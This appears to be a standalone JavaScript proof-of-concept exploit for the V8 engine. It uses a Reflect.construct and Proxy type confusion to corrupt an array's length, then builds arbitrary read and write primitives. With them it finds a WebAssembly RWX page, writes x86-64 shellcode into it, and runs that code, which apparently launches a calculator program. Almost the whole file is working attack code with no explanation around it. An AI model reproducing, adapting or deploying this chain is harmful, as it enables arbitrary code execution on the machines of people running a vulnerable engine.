var buf = new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);
var Uint32 = new Uint32Array(buf);

function f2i(f)
{
	float64[0] = f;
	return bigUint64[0]; 
}

function i2f(i)
{
	bigUint64[0] = i;
	return float64[0];
}

function f2half(val)
{
	float64[0] = val;
	let tmp = Array.from(Uint32);
	return tmp;
}

function half2f(val)
{
	Uint32.set(val);
	return float64[0];
}

function hex(i)
{
	return i.toString(16).padStart(16, "0");
}

function ByteToBigIntArray(payload)
{

    let sc = []
    let tmp = 0n;
    let lenInt = BigInt(Math.floor(payload.length/8))
    for (let i = 0n; i < lenInt; i += 1n) {
        tmp = 0n;
        for(let j=0n; j<8n; j++){
            tmp += BigInt(payload[i*8n+j])*(0x1n<<(8n*j));
        }
        sc.push(tmp);
    }

    let len = payload.length%8;
    tmp = 0n;
    for(let i=0n; i<len; i++){
        tmp += BigInt(payload[lenInt*8n+i])*(0x1n<<(8n*i));
    }
    sc.push(tmp);
    return sc;
}

function gc() {
    for (let i = 0; i < 100; i++) {
        new ArrayBuffer(0x100000);
    }
}

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);

var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var wasm_function = wasmInstance.exports.main;

var data_buf;
var obj;
var big_array;

let a = [0.1,,,,,,,,,,,,,,,,,,,,,,, 6.1, 7.1, 8.1];
var b;
a.pop();
a.pop();
a.pop();
function empty() {}
function f(nt) {
    a.push(typeof(Reflect.construct(empty, arguments, nt)) === Proxy ? 0.2 : 8.063e-320);
    for(let i=0; i<0x10000; i++){}
}

let p = new Proxy(Object, {
    get: function() {
        a[0] = {};
        b = [0.2, 1.2, 2.2, 3.2, 4.3];
		obj = {mark: 0xdead, obj: wasm_function};
		big_array = new BigUint64Array(4);
		big_array[0] = 0x1122334455667788n;
		big_array[1] = 0xaabbaabbccddccddn;
		big_array[2] = 0xdeadbeefdeadbeefn;
		big_array[3] = 0xeeeeeeeeffffffffn;
        return Object.prototype;
    }
});
function main(o) {
  for(let i = 0; i < 0x10000; i++){};
  return f(o);
}

/*
%PrepareFunctionForOptimization(empty);
%PrepareFunctionForOptimization(f);
%PrepareFunctionForOptimization(main);
*/

for(let i = 0; i < 0x10000; i++)
{
	empty();
}
main(empty);
main(empty);
//%OptimizeFunctionOnNextCall(main);
main(p);

console.log("[+] b.length : 0x" + hex(b.length));   // prints 0x1fe0

var external_pointer_idx = 0;
var base_pointer_idx = 0;
var bigarray_len_idx = 0;
var wasm_function_addr;

for(let i=0; i < 0x100; i++)
{
	if(f2i(b[i]) == 0xdeadbeefdeadbeefn){
		bigarray_len_idx = i + 6;
		console.log("[+] find bigarray length : 0x" + hex(f2i(b[bigarray_len_idx])));
		external_pointer_idx = i + 7;
		console.log("[+] find external_pointer : 0x" + hex(f2i(b[external_pointer_idx])));
		base_pointer_idx = i + 8;
		console.log("[+] find base_pointer : 0x" + hex(f2i(b[base_pointer_idx])));
		break;
	}
}

var highaddr = f2i(b[external_pointer_idx]) & 0xffffffff00000000n;
console.log("[+] highaddr : 0x" + hex(highaddr));

var wasm_idx = 0;
for(let i=0; i < 0x100; i++)
{
	let tmp = f2half(b[i]);
	if(tmp[0] == (0xdead << 1)){
		wasm_idx = i + 1;
		addr = f2half(b[wasm_idx]);
		wasm_function_addr = addr[1];  
		console.log("[+] wasm_function addr : 0x" + hex(wasm_function_addr));
		break;
	}
	else if(tmp[1] == (0xdead << 1)){
		wasm_idx = i + 1;
		addr = f2half(b[wasm_idx]);
		wasm_function_addr =  addr[0];  
		console.log("[+] wasm_function addr : 0x" + hex(wasm_function_addr));
		break;
	}
}

function arb_read(addr)
{
	b[base_pointer_idx] = i2f(addr-0x8n);
	let ret = big_array[0];
	return ret;
}

function arb_write(addr, payload)
{
	sc = ByteToBigIntArray(payload);
	b[bigarray_len_idx] = i2f(0x100n);
	b[base_pointer_idx] = i2f(0n);
	b[external_pointer_idx] = i2f(addr);

	for(let i = 0; i<sc.length; i++) {
        	big_array[i] = sc[i];
   	}
}

var wasm_shared_info = arb_read(BigInt(wasm_function_addr)+0xcn) & (0xffffffffn);
console.log("[+] wasm_shared_info : 0x" + hex(wasm_shared_info));

var wasm_data = arb_read(BigInt(wasm_shared_info)+0x4n) &(0xffffffffn);
console.log("[+] wasm_data : 0x" + hex(wasm_data));

var wasm_instance = arb_read(BigInt(wasm_data)+0x8n) &(0xffffffffn);
console.log("[+] wasm_instance : 0x" + hex(wasm_instance));

var wasm_rwx = arb_read(BigInt(wasm_instance)+0x68n);
console.log("[+] wasm_rwx : 0x" + hex(wasm_rwx));


var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
    96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
    105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
    72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
    72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
    184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
    94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];

arb_write(wasm_rwx, shellcode);

wasm_function();
